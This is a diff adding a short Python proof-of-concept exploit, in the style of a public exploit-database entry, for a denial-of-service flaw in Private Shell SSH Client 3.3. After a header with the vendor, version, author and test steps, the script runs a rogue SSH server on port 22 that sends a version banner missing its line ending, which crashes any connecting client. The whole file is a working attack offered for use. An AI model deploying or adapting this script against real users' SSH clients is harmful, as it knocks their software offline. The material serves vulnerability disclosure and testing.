@@ -1,0 +1,25 @@
+'''
+# Exploit title: privateshell SSH Client v.3.3 denial of service vulnerability
+# Date: 27-5-2015
+# Vendor homepage: www.privateshell.com
+# Software Link: http://www.privateshell.com/files/pshell.exe
+# Version: 3.3
+# Author: 3unnym00n
+
+# Details:
+# --------
+# when doing the ssh version exchange, if the server send a banner missing \r\n, can lead the pshell crash
+
+# Tested On: win7
+# operating steps: run the py, then execute : "D:\programfile\Private Shell\ssh.exe" root@127.0.0.1
+
+'''
+
+
+
+import socket
+soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+soc.bind(('127.0.0.1', 22))
+soc.listen(1)
+client, addr = soc.accept()
+client.send('SSH-2.0-SUCK') ## no "\r\n" lead to crash
